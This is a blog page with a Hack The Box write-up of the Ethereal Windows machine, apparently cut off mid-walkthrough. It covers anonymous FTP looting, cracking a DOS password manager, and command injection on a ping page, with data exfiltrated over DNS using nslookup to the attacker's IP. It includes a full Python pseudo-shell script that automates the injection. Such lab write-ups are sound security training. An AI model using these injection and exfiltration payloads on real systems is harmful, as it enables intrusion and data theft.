<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Ethereal - Hack The Box - hackcommander.io</title>
<meta name="description" content="This is the writeup for Ethereal, a very difficult Windows machine that I solved using the unintented rotten potato method before the box was patched by the HTB staff.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Ethereal - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-ethereal/">


  <meta property="og:description" content="This is the writeup for Ethereal, a very difficult Windows machine that I solved using the unintented rotten potato method before the box was patched by the HTB staff.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-ethereal/ethereal_logo.png">





  <meta property="article:published_time" content="2019-03-09T00:00:00+01:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-ethereal/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Posts</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Tags</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">About</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Ethereal - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Ethereal - Hack The Box">
    <meta itemprop="description" content="This is the writeup for Ethereal, a very difficult Windows machine that I solved using the unintented rotten potato method before the box was patched by the HTB staff.">
    <meta itemprop="datePublished" content="March 09, 2019">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Ethereal - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-03-09T00:00:00+01:00">March 09, 2019 </time> 
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-ethereal/ethereal_logo.png" alt=""></p>

<p>Ethereal was a really difficult box from <a href="https://www.secjuice.com/author/minatotw/">MinatoTW</a> and <a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a> that I solved using an unintended priv esc method with Rotten Potato. The box was patched soon after the release to block that priv esc route. The box had some trivial command injection in the Test Connection page but since pretty much everything was blocked outbound I had to use DNS exfiltration to get the output from my commands. Once I got SYSTEM access via Potato, I found <code class="language-plaintext highlighter-rouge">user.txt</code> and <code class="language-plaintext highlighter-rouge">root.txt</code> were encrypted and couldn’t be read as <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>. At that point, I’ve spent a lot of hours on this box and I just wanted to get the flags so I changed both users’s password and RDP’ed in and was able to see the flags.</p>

<h2 id="quick-summary">Quick summary</h2>

<ul>
  <li>Find the MS-DOS password manager file FDISK.zip on the FTP server</li>
  <li>Run Dosbox, downloading missing dependies for pbox.exe, retrieve passwords after guessing the secret key</li>
  <li>Find the command injection vulnerability on the “Ping” page</li>
  <li>Use command injection vulnerability to scan open outbound ports, find TCP ports 73 and 136</li>
  <li>Use certutil.exe to download nc.exe on the box, get a shell as user IIS</li>
  <li>Use certutil.exe to download Juicy Potato on the box, get a shell as SYSTEM</li>
  <li>Disable Windows Defender &amp; Windows Firewall</li>
  <li>Change passwords for users <code class="language-plaintext highlighter-rouge">jorge</code> and <code class="language-plaintext highlighter-rouge">rupal</code>, then RDP into the box to get both <code class="language-plaintext highlighter-rouge">user.txt</code> and <code class="language-plaintext highlighter-rouge">root.txt</code> flags</li>
</ul>

<h2 id="detailed-steps">Detailed steps</h2>

<h3 id="portscan">Portscan</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal# nmap -sC -sV -oA ethereal 10.10.10.106
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-08 13:35 EDT
Nmap scan report for ethereal.htb (10.10.10.106)
Host is up (0.10s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ethereal
8080/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=ethereal.htb
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.65 seconds
</code></pre></div></div>

<h3 id="ftp-enumeration">FTP enumeration</h3>

<p>Anonymous access is allowed on the FTP server.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal# ftp 10.10.10.106
Connected to 10.10.10.106.
220 Microsoft FTP Service
Name (10.10.10.106:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-10-18  10:03PM       &lt;DIR&gt;          binaries
09-02-09  09:58AM                 4122 CHIPSET.txt
01-12-03  09:58AM              1173879 DISK1.zip
01-22-11  09:58AM               182396 edb143en.exe
01-18-11  12:05PM                98302 FDISK.zip
07-10-18  09:59PM       &lt;DIR&gt;          New folder
07-10-18  10:38PM       &lt;DIR&gt;          New folder (2)
07-09-18  10:23PM       &lt;DIR&gt;          subversion-1.10.0
11-12-16  09:58AM                 4126 teamcity-server-log4j.xml
226 Transfer complete.
</code></pre></div></div>

<p>We’ll download all the files to our Kali box so it’s easier to look at files:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal# wget -r --no-passive ftp://10.10.10.106
--2018-10-08 13:38:09--  ftp://10.10.10.106/
           =&gt; ‘10.10.10.106/.listing’
Connecting to 10.10.10.106:21... connected.
</code></pre></div></div>

<h3 id="password-manager">Password manager</h3>

<p>There’s a lot of files on the FTP, the interesting one is <code class="language-plaintext highlighter-rouge">FDISK.zip</code>.</p>

<p>First, we’ll unzip it and determine it’s a FAT filesystem.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# unzip FDISK.zip 
Archive:  FDISK.zip
  inflating: FDISK

root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# file FDISK
FDISK: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", root entries 224, sectors 2880
 (volumes &lt;=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x5843af55, unlabeled, FAT (12 bit), followed by FAT
</code></pre></div></div>

<p>After mounting it, we found there’s an MS-DOS executable <code class="language-plaintext highlighter-rouge">pbox.exe</code> file in there.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# mount -t vfat -o loop FDISK /mnt
root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# ls -l /mnt
total 1
drwxr-xr-x 2 root root 512 Jul  2 19:16 pbox
root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# ls -l /mnt/pbox
total 80
-rwxr-xr-x 1 root root   284 Jul  2 19:05 pbox.dat
-rwxr-xr-x 1 root root 81384 Aug 25  2010 pbox.exe

root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# file /mnt/pbox/pbox.exe
/mnt/pbox/pbox.exe: MS-DOS executable, COFF for MS-DOS, DJGPP go32 DOS extender, UPX compressed
</code></pre></div></div>

<p>To run this, we’ll use <code class="language-plaintext highlighter-rouge">dosbox</code> and mount the Kali directory inside MS-DOS.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# cd /mnt/pbox/
root@darkisland:/mnt/pbox# dosbox
DOSBox version 0.74-2
Copyright 2002-2018 DOSBox Team, published under GNU GPL.
---
CONFIG:Loading primary settings from config file /root/.dosbox/dosbox-0.74-2.conf
MIXER:Got different values from SDL: freq 44100, blocksize 512
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-ethereal/dosbox1.png" alt=""></p>

<p>We are missing a dependency to be able to run pbox.exe</p>

<p>After a bit of googling, I found the missing dependency:</p>

<p><img src="/assets/images/htb-writeup-ethereal/dosbox2.png" alt=""></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:/mnt/pbox# wget http://teadrinker.net/tdold/mr/cwsdpmi.zip
--2018-10-08 13:47:19--  http://teadrinker.net/tdold/mr/cwsdpmi.zip
Resolving teadrinker.net (teadrinker.net)... 46.30.213.33, 2a02:2350:5:100:c840:0:24b2:20fb
Connecting to teadrinker.net (teadrinker.net)|46.30.213.33|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16799 (16K) [application/zip]
Saving to: ‘cwsdpmi.zip’

cwsdpmi.zip               100%[=====================================&gt;]  16.41K  --.-KB/s    in 0.1s    

2018-10-08 13:47:20 (125 KB/s) - ‘cwsdpmi.zip’ saved [16799/16799]

root@darkisland:/mnt/pbox# unzip cwsdpmi.zip 
Archive:  cwsdpmi.zip
  inflating: CWSDPMI.EXE
</code></pre></div></div>

<p>Now we can run the password manager, but it asks for a password.</p>

<p><img src="/assets/images/htb-writeup-ethereal/dosbox3.png" alt=""></p>

<p>The password is easily guessed: <code class="language-plaintext highlighter-rouge">password</code>, we now have access to all the passwords.</p>

<p><img src="/assets/images/htb-writeup-ethereal/dosbox4.png" alt=""></p>

<p>Found multiple credentials; the only one that is useful is: <code class="language-plaintext highlighter-rouge">!C414m17y57r1k3s4g41n!</code></p>

<h3 id="web-enumeration">Web enumeration</h3>

<p>There’s a ton of useless crap and decoys on this box, notably:</p>
<ul>
  <li>Fake desktop with a troll face &amp; flag</li>
  <li>Fake members login page</li>
</ul>

<p>There’s an administration page at <code class="language-plaintext highlighter-rouge">http://ethereal.htb:8080/</code></p>

<p><img src="/assets/images/htb-writeup-ethereal/web1.png" alt=""></p>

<p>We can log in with:</p>
<ul>
  <li>username: <code class="language-plaintext highlighter-rouge">alan</code>
</li>
  <li>password: <code class="language-plaintext highlighter-rouge">!C414m17y57r1k3s4g41n!</code>
</li>
</ul>

<p>Note: We can guess the username since the name Alan is mentionned in the notes and in some of the password manager entries</p>

<p><img src="/assets/images/htb-writeup-ethereal/web2.png" alt=""></p>

<h3 id="command-injection-using-ping-page">Command injection using ping page</h3>

<p>We can run commands by adding <code class="language-plaintext highlighter-rouge">&amp;&amp; &lt;command&gt;</code> in the command field.</p>

<p>We can validate we got RCE by pinging ourselves with <code class="language-plaintext highlighter-rouge">127.0.0.1 &amp;&amp; ping 10.10.14.23</code>.</p>

<p>The first IP is implicitely pinged by the script followed by our injected command after &amp;&amp;:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal# tcpdump -nni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
14:30:51.029999 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 39, length 40
14:30:51.030129 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 39, length 40
14:30:52.046783 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 40, length 40
14:30:52.046814 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 40, length 40
</code></pre></div></div>

<p>We can’t run any other commands like <code class="language-plaintext highlighter-rouge">certutil.exe</code> or <code class="language-plaintext highlighter-rouge">powershell.exe</code>, AppLocker is probably enabled on the box.</p>

<p>However we can exfil some data by using <code class="language-plaintext highlighter-rouge">nslookup</code>.</p>

<p>For example, using the payload <code class="language-plaintext highlighter-rouge">127.0.0.1 &amp;&amp; nslookup inject 10.10.14.23</code>, we get can get the box to do a query back to us:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~# tcpdump -nni tun0 -vv port 53
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
20:20:16.625986 IP (tos 0x0, ttl 127, id 8724, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.52125 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:20:18.652075 IP (tos 0x0, ttl 127, id 8726, offset 0, flags [none], proto UDP (17), length 52)
    10.10.10.106.52126 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? inject. (24)
20:20:20.922359 IP (tos 0x0, ttl 127, id 8727, offset 0, flags [none], proto UDP (17), length 52)
    10.10.10.106.52127 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? inject. (24)
</code></pre></div></div>

<p>What we want is to exfil the output of commands, by using the following payload we can start to output some stuff:</p>

<p><code class="language-plaintext highlighter-rouge">FOR /F "tokens=1" %g IN 'whoami' do (nslookup %g 10.10.14.23)</code></p>

<p>Output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>20:30:23.082437 IP (tos 0x0, ttl 127, id 8942, offset 0, flags [none], proto UDP (17), length 58)
    10.10.10.106.63713 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? etherealalan. (30)
</code></pre></div></div>

<p>Now, it’s not perfect, we can’t exfil special characters or anything else that is not a valid character in a DNS query. So in the query above, we can guess that the real output should be <code class="language-plaintext highlighter-rouge">ethereal\alan</code> instead of <code class="language-plaintext highlighter-rouge">etherealalan</code>.</p>

<p>So if we’re listing directories, we have to use the /b flag so it only returns the name of the directory/file otherwise we’ll need to play with the token parameter to indicate which item to read from the output.</p>

<p>Another example listing directories: <code class="language-plaintext highlighter-rouge">FOR /F "tokens=1" %g IN 'dir /b c:\users' do (nslookup %g 10.10.14.23)</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>20:35:04.531929 IP (tos 0x0, ttl 127, id 9016, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.53805 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:06.823075 IP (tos 0x0, ttl 127, id 9017, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.53806 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:08.851451 IP (tos 0x0, ttl 127, id 9018, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.53807 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:10.839111 IP (tos 0x0, ttl 127, id 9019, offset 0, flags [none], proto UDP (17), length 59)
    10.10.10.106.53808 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? Administrator. (31)
20:35:12.854740 IP (tos 0x0, ttl 127, id 9020, offset 0, flags [none], proto UDP (17), length 59)
    10.10.10.106.53809 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? Administrator. (31)
20:35:14.895892 IP (tos 0x0, ttl 127, id 9021, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.53810 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:16.886216 IP (tos 0x0, ttl 127, id 9022, offset 0, flags [none], proto UDP (17), length 50)
    10.10.10.106.53811 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? alan. (22)
20:35:19.474240 IP (tos 0x0, ttl 127, id 9023, offset 0, flags [none], proto UDP (17), length 50)
    10.10.10.106.53812 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? alan. (22)
20:35:21.312568 IP (tos 0x0, ttl 127, id 9025, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.56757 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:23.309541 IP (tos 0x0, ttl 127, id 9028, offset 0, flags [none], proto UDP (17), length 51)
    10.10.10.106.56758 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? jorge. (23)
20:35:25.299775 IP (tos 0x0, ttl 127, id 9029, offset 0, flags [none], proto UDP (17), length 51)
    10.10.10.106.56759 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? jorge. (23)
20:35:27.338241 IP (tos 0x0, ttl 127, id 9031, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.56760 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:29.355372 IP (tos 0x0, ttl 127, id 9032, offset 0, flags [none], proto UDP (17), length 52)
    10.10.10.106.56761 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? Public. (24)
20:35:31.523795 IP (tos 0x0, ttl 127, id 9034, offset 0, flags [none], proto UDP (17), length 52)
    10.10.10.106.56762 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? Public. (24)
20:35:33.646114 IP (tos 0x0, ttl 127, id 9035, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.56763 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:35.669198 IP (tos 0x0, ttl 127, id 9038, offset 0, flags [none], proto UDP (17), length 51)
    10.10.10.106.58924 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? rupal. (23)
20:35:37.681147 IP (tos 0x0, ttl 127, id 9040, offset 0, flags [none], proto UDP (17), length 51)
    10.10.10.106.58925 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? rupal. (23)
</code></pre></div></div>

<p>We just listed <code class="language-plaintext highlighter-rouge">c:\users</code> and found the following directories:</p>

<ul>
  <li>c:\users\Administrator</li>
  <li>c:\users\alan</li>
  <li>c:\users\jorge</li>
  <li>c:\users\rupal</li>
</ul>

<p>Doing things manually takes a long time so I started working on a python script to automate the process. <a href="https://www.hackthebox.eu/home/users/profile/9682">Overcast</a> [<a href="https://www.justinoblak.com/">Blog</a>] was also working on the box and was one step ahead of me. He shared with me a script he had already created.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">requests_futures.sessions</span> <span class="kn">import</span> <span class="n">FuturesSession</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">select</span>


<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'10.10.14.23'</span><span class="p">,</span> <span class="mi">53</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">recv</span><span class="p">():</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Receiving data:"</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span> <span class="c1"># A record
</span>                <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="o">-</span><span class="mi">5</span><span class="p">])</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Done"</span><span class="p">)</span>
        <span class="k">return</span>

<span class="k">def</span> <span class="nf">send</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">col</span><span class="p">):</span>
    <span class="n">session</span> <span class="o">=</span> <span class="n">FuturesSession</span><span class="p">()</span>
    <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://ethereal.htb/p1ng/"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span>
            <span class="p">{</span>
                <span class="s">"__VIEWSTATE"</span><span class="p">:</span> <span class="s">"/wEPDwULLTE0OTYxODU3NjhkZD0G/ny1VOoO1IFda8cKvyAZexSk+Y22QbXBRP0gxbre"</span><span class="p">,</span>
                <span class="s">"__VIEWSTATEGENERATOR"</span><span class="p">:</span> <span class="s">"A7095145"</span><span class="p">,</span>
                <span class="s">"__EVENTVALIDATION"</span><span class="p">:</span> <span class="s">"/wEdAAOZvFNfMAAnpqKRCMR2SHn/4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN/siIFmy9ZoaWu7BT0ak0x7Uttp88efMu6vUQ1geHQSWQ=="</span><span class="p">,</span>
                <span class="s">"search"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"127.0.0.1 &amp;&amp; FOR /F </span><span class="se">\"</span><span class="s">tokens=</span><span class="si">{</span><span class="n">col</span><span class="si">}</span><span class="se">\"</span><span class="s"> %g IN ('</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">') do (nslookup %g 10.10.14.23)"</span><span class="p">,</span>
                <span class="s">"ctl02"</span><span class="p">:</span> <span class="s">""</span>
            <span class="p">},</span>
            <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s">"http"</span><span class="p">:</span> <span class="s">"127.0.0.1:8080"</span><span class="p">})</span>

<span class="k">def</span> <span class="nf">shell</span><span class="p">():</span>
    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"$&gt; "</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s">"exit"</span><span class="p">:</span>
            <span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
            <span class="nb">exit</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">col</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"(col#)&gt; "</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">col</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
                <span class="n">col</span> <span class="o">=</span> <span class="mi">1</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">col</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">col</span><span class="p">)</span>
            <span class="n">send</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">col</span><span class="p">)</span>
            <span class="n">recv</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">shell</span><span class="p">()</span>
</code></pre></div></div>

<p>We still need to mess with the token parameter when we have output with spaces in it, but it make things but more manageable.</p>

<p><strong>whoami</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal# ./exfil_alan.py 
$&gt; whoami
(col#)&gt; 
[+] Receiving data:
b'etherealalan'
</code></pre></div></div>

<p><strong>dir c:\users\alan</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; dir /b c:\users\alan
(col#)&gt; 
[+] Receiving data:
b'Contacts'
b'Desktop'
b'Documents'
b'Downloads'
b'Favorites'
b'Links'
b'Music'
b'Pictures'
b'Saved'
b'Searches'
b'Videos'
</code></pre></div></div>

<p><strong>dir c:\users\alan\desktop</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; dir /b c:\users\alan\desktop
(col#)&gt; 
[+] Receiving data:
b'note-draft\x03txt'
</code></pre></div></div>

<p>Too bad, there’s no flag… let’s keeping looking.</p>

<p><strong>dir c:\inetpub\wwwroot</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$&gt; dir /b c:\inetpub\wwwroot
(col#)&gt; 
[+] Receiving data:
b'corp'
b'default\x04aspx'
b'p1ng'
timed out
</code></pre></div></div>

<p>Interesting, there’s a directory <code class="language-plaintext highlighter-rouge">p1ng</code>, let’s check check it out:</p>

<p><img src="/assets/images/htb-writeup-ethereal/web3.png" alt=""></p>

<p>Wow, so we didn’t even need the credentials from the password manager have we known this hidden path.</p>

<p>I got really stuck at this point and spent the next several hours trying to find ways to get a proper shell, or find hidden files that would allow me to get unstuck. I didn’t get far until at some point after I had switched the path invoked by the script to use the unauthenticated page on port 80, I realized that the <code class="language-plaintext highlighter-rouge">whoami</code> output I was now getting was different.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Ethereal# ./exfil_iis.py 
$&gt; whoami
(col#)&gt; 
[+] Receiving data:
b'iis'
</code></pre></div></div>

